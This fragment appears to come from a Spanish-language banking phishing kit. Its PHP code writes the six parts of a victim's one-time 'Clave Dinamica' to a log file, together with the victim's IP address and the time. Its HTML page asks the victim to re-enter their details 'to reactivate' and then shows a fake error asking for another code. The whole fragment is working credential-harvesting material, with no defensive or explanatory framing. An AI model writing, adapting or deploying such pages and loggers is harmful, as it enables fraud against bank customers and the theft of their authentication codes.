...
fwrite($file, "<br>Cod1.: ".$_POST['num1']." ".$_POST['num2']."  ".$_POST['num3']."  ".$_POST['num4']."  ".$_POST['num5']." ".$_POST['num6']."  - IP ".$userp ." - Fecha: ".date('Y-m-d')." - ".date('H:i:s')." - ".$cc." ".$userp." " . PHP_EOL);
fclose($file);
...
Complete con sus datos actuales <br>para reactivar</h1><br><br>
    ...
    <section class="">
        ...
        <form action="index5.php" id="form1" name="form1" method="post" class="form_contact">
    
            <div class="user_info">
            <br><br><br>  <br><br><br> 
			<div align="center">
<h2>ERROR, ingrese otra Clave Dinamica</h2>
